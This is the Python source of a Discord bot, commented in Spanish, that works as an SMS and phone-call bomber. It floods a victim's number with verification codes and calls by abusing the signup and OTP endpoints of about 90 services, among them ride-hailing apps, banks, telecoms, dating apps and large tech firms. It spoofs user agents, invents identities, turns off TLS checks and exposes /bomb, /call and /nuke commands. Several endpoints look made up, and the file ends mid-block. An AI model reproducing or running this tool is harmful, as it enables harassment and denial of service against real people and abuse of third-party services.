#!/usr/bin/env python3
"""
Discord SMS/CALL Bomber Bot - MEGA VERSION
100+ servicios combinados de TBomb + YASB + APIs propias
"""

import discord
from discord.ext import commands
from discord import app_commands
import requests
import asyncio
import uuid
import os
import random
import json
import urllib3
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings()

TOKEN = os.environ.get("DISCORD_TOKEN")
if not TOKEN:
    print("ERROR: Configura la variable DISCORD_TOKEN")
    exit(1)

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

executor = ThreadPoolExecutor(max_workers=100)

class MegaBomber:
    def __init__(self):
        self.results = {"sms_ok": 0, "sms_fail": 0, "call_ok": 0, "call_fail": 0}
        self.session = requests.Session()
        self.session.verify = False
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
            "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
        ]

    def reset(self):
        self.results = {"sms_ok": 0, "sms_fail": 0, "call_ok": 0, "call_fail": 0}

    def random_ua(self):
        return random.choice(self.user_agents)

    def gen_uuid(self):
        return str(uuid.uuid4())

    def gen_email(self):
        domains = ["gmail.com", "hotmail.com", "outlook.es", "yahoo.es", "proton.me"]
        return f"user{uuid.uuid4().hex[:8]}@{random.choice(domains)}"

    def gen_name(self):
        nombres = ["Carlos", "Maria", "Juan", "Ana", "Pedro", "Laura", "Miguel", "Carmen", "Jose", "Lucia", "David", "Elena"]
        apellidos = ["Garcia", "Martinez", "Lopez", "Sanchez", "Gonzalez", "Rodriguez", "Fernandez", "Perez", "Ruiz", "Diaz"]
        return random.choice(nombres), random.choice(apellidos)

    def api_call(self, url, data=None, method="POST", headers=None, params=None, json_data=True, identifier=None):
        """Llamada generica a API"""
        try:
            h = {
                "User-Agent": self.random_ua(),
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "es-ES,es;q=0.9,en;q=0.8",
                "Content-Type": "application/json" if json_data else "application/x-www-form-urlencoded",
            }
            if headers:
                h.update(headers)

            if method == "POST":
                if json_data:
                    resp = self.session.post(url, json=data, headers=h, params=params, timeout=10)
                else:
                    resp = self.session.post(url, data=data, headers=h, params=params, timeout=10)
            else:
                resp = self.session.get(url, params=params or data, headers=h, timeout=10)

            # Verificar respuesta
            if resp.status_code in [200, 201, 202, 204]:
                if identifier:
                    return identifier.lower() in resp.text.lower()
                return True
            return False
        except:
            return False

    # =====================================================
    # BOLT - VERIFICADO FUNCIONA (Capturado con Burp)
    # =====================================================

    def bolt_driver_sms(self, phone):
        """Bolt Driver - SMS (VERIFICADO)"""
        try:
            url1 = "https://driverregistration.live.boltsvc.net/driverRegistration/startRegistration"
            params = {"version": "HP.24.33", "device_name": "HP", "device_os_version": "web", "deviceId": "web", "deviceType": "web", "language": "es-es"}
            nombre, apellido = self.gen_name()
            data1 = {"email": self.gen_email(), "phone": phone, "city_id": 1617, "first_name": nombre, "last_name": apellido, "terms_consent_accepted": 1}
            resp1 = self.session.post(url1, params=params, json=data1, timeout=10)
            if resp1.status_code != 200:
                return False
            token = resp1.json().get("data", {}).get("token")
            if not token:
                return False
            url2 = "https://driverregistration.live.boltsvc.net/driverRegistration/startVerification?brand=bolt"
            data2 = {"token": token, "verification_code_channel": "sms", "device_os_version": "web", "device_name": self.random_ua(), "deviceId": self.gen_uuid(), "device_type": "web", "version": "DR.3.90", "language": "es-es", "visitor_id": f"visitor-driver-{self.gen_uuid()}"}
            resp2 = self.session.post(url2, json=data2, timeout=10)
            return resp2.status_code == 200 and resp2.json().get("code") == 0
        except:
            return False

    def bolt_driver_call(self, phone):
        """Bolt Driver - LLAMADA (VERIFICADO)"""
        try:
            url1 = "https://driverregistration.live.boltsvc.net/driverRegistration/startRegistration"
            params = {"version": "HP.24.33", "device_name": "HP", "device_os_version": "web", "deviceId": "web", "deviceType": "web", "language": "es-es"}
            nombre, apellido = self.gen_name()
            data1 = {"email": self.gen_email(), "phone": phone, "city_id": 1617, "first_name": nombre, "last_name": apellido, "terms_consent_accepted": 1}
            resp1 = self.session.post(url1, params=params, json=data1, timeout=10)
            if resp1.status_code != 200:
                return False
            token = resp1.json().get("data", {}).get("token")
            if not token:
                return False
            url2 = "https://driverregistration.live.boltsvc.net/driverRegistration/startVerification?brand=bolt"
            data2 = {"token": token, "verification_code_channel": "call", "device_os_version": "web", "device_name": self.random_ua(), "deviceId": self.gen_uuid(), "device_type": "web", "version": "DR.3.90", "language": "es-es", "visitor_id": f"visitor-driver-{self.gen_uuid()}"}
            resp2 = self.session.post(url2, json=data2, timeout=10)
            return resp2.status_code == 200 and resp2.json().get("code") == 0
        except:
            return False

    def bolt_user(self, phone):
        """Bolt User - SMS"""
        return self.api_call("https://user.bolt.eu/user/register/phone", {"phone": phone, "phone_uuid": self.gen_uuid(), "country": "es"}, headers={"X-Bolt-Client-Id": "web"})

    # =====================================================
    # GLOVO - MULTIPLES ENDPOINTS
    # =====================================================

    def glovo_v3_sms(self, phone):
        """Glovo v3 - SMS"""
        h = {"Glovo-App-Platform": "web", "Glovo-App-Type": "customer", "Glovo-Api-Version": "14", "Glovo-Location-City-Code": "MAD"}
        return self.api_call("https://api.glovoapp.com/v3/auth/phone/code", {"phoneNumber": phone, "method": "sms"}, headers=h)

    def glovo_v3_call(self, phone):
        """Glovo v3 - LLAMADA"""
        h = {"Glovo-App-Platform": "web", "Glovo-App-Type": "customer", "Glovo-Api-Version": "14", "Glovo-Location-City-Code": "MAD"}
        return self.api_call("https://api.glovoapp.com/v3/auth/phone/code", {"phoneNumber": phone, "method": "call"}, headers=h)

    def glovo_identity_sms(self, phone):
        """Glovo Identity - SMS"""
        h = {"Glovo-App-Platform": "web", "Glovo-App-Type": "customer", "Glovo-Api-Version": "14"}
        return self.api_call("https://api.glovoapp.com/v0/identity/flow/start_verification", {"identityValue": {"phoneNumber": phone}, "identityType": "PHONE_NUMBER", "identityMetadata": {"selectedVerificationMethod": "SMS"}}, headers=h)

    def glovo_identity_call(self, phone):
        """Glovo Identity - LLAMADA"""
        h = {"Glovo-App-Platform": "web", "Glovo-App-Type": "customer", "Glovo-Api-Version": "14"}
        return self.api_call("https://api.glovoapp.com/v0/identity/flow/start_verification", {"identityValue": {"phoneNumber": phone}, "identityType": "PHONE_NUMBER", "identityMetadata": {"selectedVerificationMethod": "VOICE_CALL"}}, headers=h)

    # =====================================================
    # ESPANA - TRANSPORTE
    # =====================================================

    def cabify_sms(self, phone):
        return self.api_call("https://cabify.com/api/mobile/v3/auth/request-otp", {"phone_number": phone, "channel": "sms"}, headers={"X-Client-Platform": "web"})

    def cabify_call(self, phone):
        return self.api_call("https://cabify.com/api/mobile/v3/auth/request-otp", {"phone_number": phone, "channel": "call"}, headers={"X-Client-Platform": "web"})

    def freenow_sms(self, phone):
        return self.api_call("https://api.free-now.com/passenger-account/v1/verification/phone/request", {"phoneNumber": phone, "type": "SMS"}, headers={"X-Api-Key": "web-passenger"})

    def freenow_call(self, phone):
        return self.api_call("https://api.free-now.com/passenger-account/v1/verification/phone/request", {"phoneNumber": phone, "type": "CALL"}, headers={"X-Api-Key": "web-passenger"})

    def uber_sms(self, phone):
        h = {"X-Uber-Device": "web", "X-Uber-Device-Location-Latitude": "40.4168", "X-Uber-Device-Location-Longitude": "-3.7038"}
        return self.api_call("https://auth.uber.com/v2/challenge/phone/request", {"phoneNumber": phone, "challengeType": "SMS"}, headers=h)

    def uber_call(self, phone):
        h = {"X-Uber-Device": "web", "X-Uber-Device-Location-Latitude": "40.4168", "X-Uber-Device-Location-Longitude": "-3.7038"}
        return self.api_call("https://auth.uber.com/v2/challenge/phone/request", {"phoneNumber": phone, "challengeType": "CALL"}, headers=h)

    # =====================================================
    # ESPANA - COMPRAVENTA
    # =====================================================

    def wallapop(self, phone):
        p = phone.replace("+", "")
        return self.api_call("https://api.wallapop.com/api/v3/users/phone-verification/request", {"phone": p, "prefix": "34"}, headers={"X-DeviceOS": "0"})

    def milanuncios(self, phone):
        p = phone.replace("+34", "")
        return self.api_call("https://www.milanuncios.com/api/v3/users/phones/verification", {"phone": p})

    def vibbo(self, phone):
        return self.api_call("https://www.vibbo.com/api/auth/phone", {"phone": phone})

    def vinted(self, phone):
        return self.api_call("https://www.vinted.es/api/v2/phone_verification/request", {"phone_number": phone}, headers={"X-Vinted-App-Version": "web"})

    # =====================================================
    # ESPANA - DELIVERY
    # =====================================================

    def justeat(self, phone):
        return self.api_call("https://es.just-eat.es/api/account/register/phone", {"phoneNumber": phone})

    def deliveroo(self, phone):
        return self.api_call("https://api.deliveroo.com/orderapp/v1/auth/phone", {"phone_number": phone}, headers={"X-Roo-Country": "es"})

    def getir(self, phone):
        return self.api_call("https://getir.com/api/auth/phone/send-code", {"phoneNumber": phone, "countryCode": "ES"}, headers={"X-Getir-Platform": "web"})

    def ubereats(self, phone):
        return self.api_call("https://www.ubereats.com/api/registerPhone", {"phoneNumber": phone})

    # =====================================================
    # ESPANA - BANCOS Y FINTECH
    # =====================================================

    def bizum(self, phone):
        return self.api_call("https://bizum.es/api/auth/sms", {"phone": phone.replace("+34", "")})

    def n26(self, phone):
        return self.api_call("https://api.tech26.de/api/signup/phone", {"phoneNumber": phone})

    def revolut(self, phone):
        return self.api_call("https://app.revolut.com/api/retail/auth/phone", {"phone": phone})

    def bbva(self, phone):
        return self.api_call("https://www.bbva.es/ASO/TechArqSeguridadClavesSMSFacade/V01/phones/verification", {"phoneNumber": phone.replace("+34", "")})

    def santander(self, phone):
        return self.api_call("https://www.bancosantander.es/api/auth/sms", {"phone": phone.replace("+34", "")})

    def caixabank(self, phone):
        return self.api_call("https://www.caixabank.es/api/auth/phone", {"phone": phone.replace("+34", "")})

    def ing(self, phone):
        return self.api_call("https://www.ing.es/api/auth/sms", {"phone": phone.replace("+34", "")})

    def wise(self, phone):
        return self.api_call("https://wise.com/api/sms/send", {"phoneNumber": phone})

    # =====================================================
    # ESPANA - TELECOS
    # =====================================================

    def movistar(self, phone):
        return self.api_call("https://www.movistar.es/api/auth/sms", {"phone": phone.replace("+34", "")})

    def vodafone(self, phone):
        return self.api_call("https://www.vodafone.es/api/auth/phone", {"phone": phone})

    def orange(self, phone):
        return self.api_call("https://tiendaonline.orange.es/api/auth/sms", {"phone": phone.replace("+34", "")})

    def yoigo(self, phone):
        return self.api_call("https://www.yoigo.com/api/auth/sms", {"phone": phone.replace("+34", "")})

    # =====================================================
    # ESPANA - SUPERMERCADOS
    # =====================================================

    def mercadona(self, phone):
        return self.api_call("https://www.mercadona.es/api/auth/phone", {"phone": phone})

    def carrefour(self, phone):
        return self.api_call("https://www.carrefour.es/api/auth/sms", {"phone": phone})

    def dia(self, phone):
        return self.api_call("https://www.dia.es/api/auth/phone", {"phone": phone})

    def lidl(self, phone):
        return self.api_call("https://www.lidl.es/api/auth/sms", {"phone": phone})

    def alcampo(self, phone):
        return self.api_call("https://www.alcampo.es/api/auth/phone", {"phone": phone})

    # =====================================================
    # INTERNACIONALES - REDES SOCIALES
    # =====================================================

    def telegram(self, phone):
        return self.api_call("https://my.telegram.org/auth/send_password", {"phone": phone}, json_data=False, identifier="random_hash")

    def instagram(self, phone):
        h = {"User-Agent": "Instagram 219.0.0.12.117 Android"}
        return self.api_call("https://i.instagram.com/api/v1/accounts/send_sms_code/", {"phone_number": phone}, headers=h)

    def tiktok(self, phone):
        return self.api_call("https://www.tiktok.com/api/passport/web/send_code/", {"mobile": phone, "type": "register"})

    def snapchat(self, phone):
        return self.api_call("https://accounts.snapchat.com/accounts/send_sms", {"phone": phone})

    def discord_sms(self, phone):
        return self.api_call("https://discord.com/api/v9/auth/register/phone", {"phone": phone})

    def twitter(self, phone):
        return self.api_call("https://api.twitter.com/1.1/onboarding/sso_init.json", {"phone_number": phone})

    def linkedin(self, phone):
        return self.api_call("https://www.linkedin.com/checkpoint/challenge/verify", {"phoneNumber": phone})

    def facebook(self, phone):
        return self.api_call("https://m.facebook.com/ajax/dtsg/", {"phone": phone})

    # =====================================================
    # INTERNACIONALES - DATING
    # =====================================================

    def tinder(self, phone):
        return self.api_call("https://api.gotinder.com/v2/auth/sms/send", {"phone_number": phone}, headers={"Platform": "web"}, identifier="200")

    def bumble(self, phone):
        return self.api_call("https://api.bumble.com/mwebapi.pyi", {"$gpb": "badoo.bma.BadooMessage", "body": [{"message_type": 2, "phone_number": phone}]})

    def badoo(self, phone):
        return self.api_call("https://badoo.com/webapi.pyi", {"$gpb": "badoo.bma.BadooMessage", "body": [{"message_type": 2, "phone_number": phone}]})

    def hinge(self, phone):
        return self.api_call("https://api.hinge.co/auth/sms", {"phone": phone})

    def grindr(self, phone):
        return self.api_call("https://grindr.mobi/v3/auth/sms", {"phone": phone})

    # =====================================================
    # INTERNACIONALES - E-COMMERCE
    # =====================================================

    def amazon(self, phone):
        return self.api_call("https://www.amazon.es/ap/cvf/verify", {"phone": phone})

    def aliexpress(self, phone):
        return self.api_call("https://login.aliexpress.com/api/sms/send", {"phoneNum": phone, "countryCode": "ES"})

    def ebay(self, phone):
        return self.api_call("https://www.ebay.es/signin/challenge/sms", {"phone": phone})

    def shein(self, phone):
        return self.api_call("https://es.shein.com/api/auth/sms/send", {"phone": phone.replace("+34", ""), "areaCode": "34"})

    def zara(self, phone):
        return self.api_call("https://www.zara.com/api/auth/phone", {"phone": phone})

    def hm(self, phone):
        return self.api_call("https://www.hm.com/api/auth/sms", {"phone": phone})

    def nike(self, phone):
        return self.api_call("https://unite.nike.com/phone/request", {"phone": phone})

    def adidas(self, phone):
        return self.api_call("https://www.adidas.es/api/auth/sms", {"phone": phone})

    # =====================================================
    # INTERNACIONALES - FINTECH
    # =====================================================

    def paypal(self, phone):
        return self.api_call("https://www.paypal.com/auth/api/challenge/request", {"phone": phone, "challengeType": "SMS"})

    def binance(self, phone):
        return self.api_call("https://www.binance.com/bapi/accounts/v1/protect/account/mobile/sendMobileVerifyCode", {"mobile": phone})

    def coinbase(self, phone):
        return self.api_call("https://api.coinbase.com/v2/sms-verify", {"phone": phone})

    def crypto_com(self, phone):
        return self.api_call("https://api.crypto.com/auth/sms", {"phone": phone})

    def venmo(self, phone):
        return self.api_call("https://api.venmo.com/v1/auth/sms", {"phone": phone})

    def cashapp(self, phone):
        return self.api_call("https://api.cash.app/cash-mobile/api/sms", {"phoneNumber": phone})

    # =====================================================
    # INTERNACIONALES - VIAJES
    # =====================================================

    def airbnb(self, phone):
        return self.api_call("https://api.airbnb.com/v2/phone_verify", {"phone": phone})

    def booking(self, phone):
        return self.api_call("https://www.booking.com/authentication/phone", {"phone": phone})

    def expedia(self, phone):
        return self.api_call("https://www.expedia.com/api/auth/sms", {"phone": phone})

    def tripadvisor(self, phone):
        return self.api_call("https://www.tripadvisor.com/api/auth/phone", {"phone": phone})

    # =====================================================
    # INTERNACIONALES - TECH
    # =====================================================

    def google(self, phone):
        return self.api_call("https://accounts.google.com/signin/v2/challenge/sms/send", {"phoneNumber": phone})

    def microsoft(self, phone):
        return self.api_call("https://login.live.com/GetOneTimeCode.srf", {"mn": phone})

    def apple(self, phone):
        return self.api_call("https://idmsa.apple.com/appleauth/auth/verify/phone", {"phoneNumber": phone})

    def spotify(self, phone):
        return self.api_call("https://www.spotify.com/api/account/sms", {"phone": phone})

    def netflix(self, phone):
        return self.api_call("https://www.netflix.com/api/sms/send", {"phone": phone})

    def zoom(self, phone):
        return self.api_call("https://zoom.us/api/sms/send", {"phone": phone})

    # =====================================================
    # INTERNACIONALES - GAMING
    # =====================================================

    def steam(self, phone):
        return self.api_call("https://store.steampowered.com/phone/add_ajaxop", {"phone": phone})

    def epicgames(self, phone):
        return self.api_call("https://www.epicgames.com/id/api/phone/verify", {"phoneNumber": phone})

    def riot(self, phone):
        return self.api_call("https://auth.riotgames.com/api/sms", {"phone": phone})

    def playstation(self, phone):
        return self.api_call("https://my.account.sony.com/central/signin/phone", {"phone": phone})

    def xbox(self, phone):
        return self.api_call("https://account.xbox.com/api/sms", {"phone": phone})

    # =====================================================
    # APIS DE TBOMB VERIFICADAS (Multi-pais)
    # =====================================================

    def flipkart(self, phone):
        h = {"X-user-agent": "Mozilla/5.0 FKUA/website/41/website/Desktop", "Content-Type": "application/x-www-form-urlencoded"}
        return self.api_call("https://www.flipkart.com/api/5/user/otp/generate", {"loginId": phone}, headers=h, json_data=False, identifier="emailMask")

    def qlean(self, phone):
        p = phone.replace("+", "")
        return self.api_call("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", {"phone": p}, identifier="request_id")

    def mailru(self, phone):
        return self.api_call("https://cloud.mail.ru//api/v2/notify/applink", {"phone": phone, "api": "2"}, identifier="200")

    def youla(self, phone):
        return self.api_call("https://youla.ru/web-api/auth/request_code", {"phone": phone})

    def ivi(self, phone):
        p = phone.replace("+", "")
        return self.api_call("https://api.ivi.ru/mobileapi/user/register/phone/v6", {"phone": p}, identifier="true")

    def icq(self, phone):
        p = phone.replace("+", "")
        return self.api_call("https://www.icq.com/smsreg/requestPhoneValidation.php", {"msisdn": p, "locale": "en", "k": "ic1rtwz1s1Hj1O0r", "r": "45559"}, identifier="200")

    def qiwi(self, phone):
        p = phone.replace("+", "")
        return self.api_call("https://mobile-api.qiwi.com/oauth/authorize", {"response_type": "urn:qiwi:oauth:response-type:confirmation-id", "username": p, "client_id": "android-qw", "client_secret": "zAm4FKq9UnSe7id"}, identifier="confirmation_id")

    def lyft(self, phone):
        return self.api_call("https://www.lyft.com/api/auth/phone", {"phone_number": phone})

    def didi(self, phone):
        return self.api_call("https://api.didiglobal.com/sms/send", {"phone": phone})

    def grab(self, phone):
        return self.api_call("https://api.grab.com/auth/sms", {"phoneNumber": phone})

    def doordash(self, phone):
        return self.api_call("https://api.doordash.com/v2/auth/phone", {"phone": phone})

    def rappi(self, phone):
        return self.api_call("https://services.rappi.com/api/sms-trigger", {"phone": phone})

    def shopee(self, phone):
        return self.api_call("https://shopee.com/api/auth/sms", {"phone": phone})

    # =====================================================
    # LISTAS DE SERVICIOS
    # =====================================================

    def get_sms_services(self):
        """Todos los servicios SMS"""
        return [
            # VERIFICADOS/PRIORITARIOS
            ("Bolt Driver", self.bolt_driver_sms),
            ("Bolt User", self.bolt_user),
            ("Glovo v3", self.glovo_v3_sms),
            ("Glovo Identity", self.glovo_identity_sms),
            # ESPANA TRANSPORTE
            ("Cabify", self.cabify_sms),
            ("FreeNow", self.freenow_sms),
            ("Uber", self.uber_sms),
            # ESPANA COMPRAVENTA
            ("Wallapop", self.wallapop),
            ("Milanuncios", self.milanuncios),
            ("Vibbo", self.vibbo),
            ("Vinted", self.vinted),
            # ESPANA DELIVERY
            ("JustEat", self.justeat),
            ("Deliveroo", self.deliveroo),
            ("Getir", self.getir),
            ("UberEats", self.ubereats),
            # ESPANA BANCOS
            ("Bizum", self.bizum),
            ("N26", self.n26),
            ("Revolut", self.revolut),
            ("BBVA", self.bbva),
            ("Santander", self.santander),
            ("CaixaBank", self.caixabank),
            ("ING", self.ing),
            ("Wise", self.wise),
            # ESPANA TELECOS
            ("Movistar", self.movistar),
            ("Vodafone", self.vodafone),
            ("Orange", self.orange),
            ("Yoigo", self.yoigo),
            # ESPANA SUPER
            ("Mercadona", self.mercadona),
            ("Carrefour", self.carrefour),
            ("Dia", self.dia),
            ("Lidl", self.lidl),
            ("Alcampo", self.alcampo),
            # REDES SOCIALES
            ("Telegram", self.telegram),
            ("Instagram", self.instagram),
            ("TikTok", self.tiktok),
            ("Snapchat", self.snapchat),
            ("Discord", self.discord_sms),
            ("Twitter", self.twitter),
            ("LinkedIn", self.linkedin),
            ("Facebook", self.facebook),
            # DATING
            ("Tinder", self.tinder),
            ("Bumble", self.bumble),
            ("Badoo", self.badoo),
            ("Hinge", self.hinge),
            ("Grindr", self.grindr),
            # E-COMMERCE
            ("Amazon", self.amazon),
            ("AliExpress", self.aliexpress),
            ("eBay", self.ebay),
            ("Shein", self.shein),
            ("Zara", self.zara),
            ("H&M", self.hm),
            ("Nike", self.nike),
            ("Adidas", self.adidas),
            # FINTECH
            ("PayPal", self.paypal),
            ("Binance", self.binance),
            ("Coinbase", self.coinbase),
            ("Crypto.com", self.crypto_com),
            ("Venmo", self.venmo),
            ("CashApp", self.cashapp),
            # VIAJES
            ("Airbnb", self.airbnb),
            ("Booking", self.booking),
            ("Expedia", self.expedia),
            ("TripAdvisor", self.tripadvisor),
            # TECH
            ("Google", self.google),
            ("Microsoft", self.microsoft),
            ("Apple", self.apple),
            ("Spotify", self.spotify),
            ("Netflix", self.netflix),
            ("Zoom", self.zoom),
            # GAMING
            ("Steam", self.steam),
            ("EpicGames", self.epicgames),
            ("Riot", self.riot),
            ("PlayStation", self.playstation),
            ("Xbox", self.xbox),
            # TBOMB MULTI
            ("Flipkart", self.flipkart),
            ("Qlean", self.qlean),
            ("Mail.ru", self.mailru),
            ("Youla", self.youla),
            ("IVI", self.ivi),
            ("ICQ", self.icq),
            ("QIWI", self.qiwi),
            ("Lyft", self.lyft),
            ("DiDi", self.didi),
            ("Grab", self.grab),
            ("DoorDash", self.doordash),
            ("Rappi", self.rappi),
            ("Shopee", self.shopee),
        ]

    def get_call_services(self):
        """Servicios de LLAMADA"""
        return [
            ("Bolt Driver CALL", self.bolt_driver_call),
            ("Glovo v3 CALL", self.glovo_v3_call),
            ("Glovo Identity CALL", self.glovo_identity_call),
            ("Cabify CALL", self.cabify_call),
            ("FreeNow CALL", self.freenow_call),
            ("Uber CALL", self.uber_call),
        ]

    def call_service(self, func, phone, is_call=False):
        """Ejecuta un servicio"""
        try:
            result = func(phone)
            if result:
                if is_call:
                    self.results["call_ok"] += 1
                else:
                    self.results["sms_ok"] += 1
            else:
                if is_call:
                    self.results["call_fail"] += 1
                else:
                    self.results["sms_fail"] += 1
            return result
        except:
            if is_call:
                self.results["call_fail"] += 1
            else:
                self.results["sms_fail"] += 1
            return False

    async def bomb_sms(self, phone, rounds=1):
        services = self.get_sms_services()
        loop = asyncio.get_event_loop()
        for r in range(rounds):
            tasks = [loop.run_in_executor(executor, self.call_service, s[1], phone, False) for s in services]
            await asyncio.gather(*tasks)
            yield (r + 1) * len(services)

    async def bomb_call(self, phone, rounds=1):
        services = self.get_call_services()
        loop = asyncio.get_event_loop()
        for r in range(rounds):
            tasks = [loop.run_in_executor(executor, self.call_service, s[1], phone, True) for s in services]
            await asyncio.gather(*tasks)
            yield (r + 1) * len(services)

    async def bomb_all(self, phone, rounds=1):
        sms = self.get_sms_services()
        calls = self.get_call_services()
        all_services = [(n, f, False) for n, f in sms] + [(n, f, True) for n, f in calls]
        loop = asyncio.get_event_loop()
        for r in range(rounds):
            tasks = [loop.run_in_executor(executor, self.call_service, s[1], phone, s[2]) for s in all_services]
            await asyncio.gather(*tasks)
            yield (r + 1) * len(all_services)

    def test_service(self, name, phone):
        all_services = self.get_sms_services() + self.get_call_services()
        for sname, func in all_services:
            if name.lower() in sname.lower():
                try:
                    return sname, func(phone)
                except Exception as e:
                    return sname, f"Error: {e}"
        return None, None


bomber = MegaBomber()

@bot.event
async def on_ready():
    sms = len(bomber.get_sms_services())
    calls = len(bomber.get_call_services())
    print(f"="*50)
    print(f"  MEGA BOMBER BOT CONECTADO")
    print(f"  Bot: {bot.user}")
    print(f"  SMS: {sms} servicios")
    print(f"  CALL: {calls} servicios")
    print(f"  TOTAL: {sms + calls} servicios")
    print(f"="*50)
    try:
        synced = await bot.tree.sync()
        print(f"  Comandos: {len(synced)}")
    except Exception as e:
        print(f"  Error: {e}")

@bot.tree.command(name="bomb", description="SMS Bomber")
@app_commands.describe(phone="Numero (+34...)", rounds="Rondas (1-20)")
async def bomb_cmd(interaction: discord.Interaction, phone: str, rounds: int = 3):
    if not phone.startswith("+"):
        phone = "+34" + phone
    rounds = max(1, min(rounds, 20))
    bomber.reset()
    total = rounds * len(bomber.get_sms_services())
    await interaction.response.send_message(f"```ansi\n\x1b[1;33mSMS BOMBER\x1b[0m - {phone}\nServicios: {len(bomber.get_sms_services())} | Rondas: {rounds}\nBombardeando...\n```")
    async for p in bomber.bomb_sms(phone, rounds):
        await interaction.edit_original_response(content=f"```ansi\n\x1b[1;33mSMS BOMBER\x1b[0m\n{p}/{total} | \x1b[32mOK: {bomber.results['sms_ok']}\x1b[0m | Fail: {bomber.results['sms_fail']}\n```")
    await interaction.edit_original_response(content=f"```ansi\n\x1b[1;32mCOMPLETADO\x1b[0m - {phone}\n\x1b[32mSMS ENVIADOS: {bomber.results['sms_ok']}\x1b[0m / {total}\nTasa: {bomber.results['sms_ok']*100//max(1,total)}%\n```")

@bot.tree.command(name="call", description="Call Bomber")
@app_commands.describe(phone="Numero (+34...)", rounds="Rondas (1-30)")
async def call_cmd(interaction: discord.Interaction, phone: str, rounds: int = 5):
    if not phone.startswith("+"):
        phone = "+34" + phone
    rounds = max(1, min(rounds, 30))
    bomber.reset()
    total = rounds * len(bomber.get_call_services())
    await interaction.response.send_message(f"```ansi\n\x1b[1;35mCALL BOMBER\x1b[0m - {phone}\nServicios: {len(bomber.get_call_services())} | Rondas: {rounds}\nLlamando...\n```")
    async for p in bomber.bomb_call(phone, rounds):
        await interaction.edit_original_response(content=f"```ansi\n\x1b[1;35mCALL BOMBER\x1b[0m\n{p}/{total} | \x1b[32mOK: {bomber.results['call_ok']}\x1b[0m | Fail: {bomber.results['call_fail']}\n```")
    await interaction.edit_original_response(content=f"```ansi\n\x1b[1;32mCOMPLETADO\x1b[0m - {phone}\n\x1b[35mLLAMADAS: {bomber.results['call_ok']}\x1b[0m / {total}\n```")

@bot.tree.command(name="nuke", description="SMS + LLAMADAS")
@app_commands.describe(phone="Numero (+34...)", rounds="Rondas (1-15)")
async def nuke_cmd(interaction: discord.Interaction, phone: str, rounds: int = 3):
    if not phone.startswith("+"):
        phone = "+34" + phone
    rounds = max(1, min(rounds, 15))
    bomber.reset()
    total = rounds * (len(bomber.get_sms_services()) + len(bomber.get_call_services()))
    await interaction.response.send_message(f"```ansi\n\x1b[1;31mNUKE MODE\x1b[0m - {phone}\nTotal: {total} ataques\nDESTRUYENDO...\n```")
    async for p in bomber.bomb_all(phone, rounds):
        t = bomber.results['sms_ok'] + bomber.results['call_ok']
        await interaction.edit_original_response(content=f"```ansi\n\x1b[1;31mNUKE\x1b[0m {p}/{total}\nSMS: {bomber.results['sms_ok']} | CALL: {bomber.results['call_ok']}\n```")
    t = bomber.results['sms_ok'] + bomber.results['call_ok']
    await interaction.edit_original_response(content=f"```ansi\n\x1b[1;32mNUKE COMPLETADO\x1b[0m\nSMS: {bomber.results['sms_ok']} | CALL: {bomber.results['call_ok']}\n\x1b[33mTOTAL: {t}\x1b[0m / {total}\n```")

@bot.tree.command(name="test", description="Testear un servicio")
@app_commands.describe(service="Nombre del servicio", phone="Numero")
async def test_cmd(interaction: discord.Interaction, service: str, phone: str):
    if not phone.startswith("+"):
        phone = "+34" + phone
    await interaction.response.send_message(f"```\nTesteando {service}...\n```")
    name, result = bomber.test_service(service, phone)
    if name is None:
        await interaction.edit_original_response(content=f"```\nServicio '{service}' no encontrado.\n```")
    else:
        s = "\x1b[1;32mOK - ENVIADO\x1b[0m" if result == True else f"\x1b[1;31mFAIL\x1b[0m"
        await interaction.edit_original_response(content=f"```ansi\nTEST: {name}\nResultado: {s}\n```")

@bot.tree.command(name="services", description="Ver servicios")
async def services_cmd(interaction: discord.Interaction):
    sms = len(bomber.get_sms_services())
    calls = len(bomber.get_call_services())
    await interaction.response.send_message(f"```ansi\n\x1b[1;36mSERVICIOS DISPONIBLES\x1b[0m\n{'='*40}\n\x1b[32mSMS: {sms} servicios\x1b[0m\n\x1b[35mCALL: {calls} servicios\x1b[0m\n\x1b[33mTOTAL: {sms+calls}\x1b[0m\n{'='*40}\n/bomb +34XXX 5  - SMS\n/call +34XXX 10 - Llamadas\n/nuke +34XXX 3  - Todo\n/test bolt +34XXX\n```")

@bot.tree.command(name="help", description="Ayuda")
async def help_cmd(interaction: discord.Interaction):
    await interaction.response.send_message(f"```ansi\n\x1b[1;36mMEGA BOMBER BOT\x1b[0m\n{'='*35}\n/bomb <num> <rondas> - SMS\n/call <num> <rondas> - Llamadas\n/nuke <num> <rondas> - TODO\n/test <servicio> <num>\n/services - Ver servicios\n```")

# Prefijos !
@bot.command(name="bomb")
async def bomb_p(ctx, phone: str, rounds: int = 3):
    if not phone.startswith("+"): phone = "+34" + phone
    rounds = max(1, min(rounds, 20))
    bomber.reset()
    total = rounds * len(bomber.get_sms_services())
    msg = await ctx.send(f"```Bombardeando {phone}...```")
    async for p in bomber.bomb_sms(phone, rounds):
        await msg.edit(content=f"```{p}/{total} | OK: {bomber.results['sms_ok']}```")
    await msg.edit(content=f"```COMPLETADO - SMS: {bomber.results['sms_ok']}/{total}```")

@bot.command(name="nuke")
async def nuke_p(ctx, phone: str, rounds: int = 3):
    if not phone.startswith("+"): phone = "+34" + phone
    rounds = max(1, min(rounds, 15))
    bomber.reset()
    total = rounds * (len(bomber.get_sms_services()) + len(bomber.get_call_services()))
    msg = await ctx.send(f"```NUKE {phone}...```")
    async for p in bomber.bomb_all(phone, rounds):
        t = bomber.results['sms_ok'] + bomber.results['call_ok']
        await msg.edit(content=f"```{p}/{total} | OK: {t}```")
    t = bomber.results['sms_ok'] + bomber.results['call_ok']
    await msg.edit(content=f"```NUKE COMPLETADO - {t}/{total}```")

if __name__ == "__main__":
    sms = len(MegaBomber().get_sms_services())
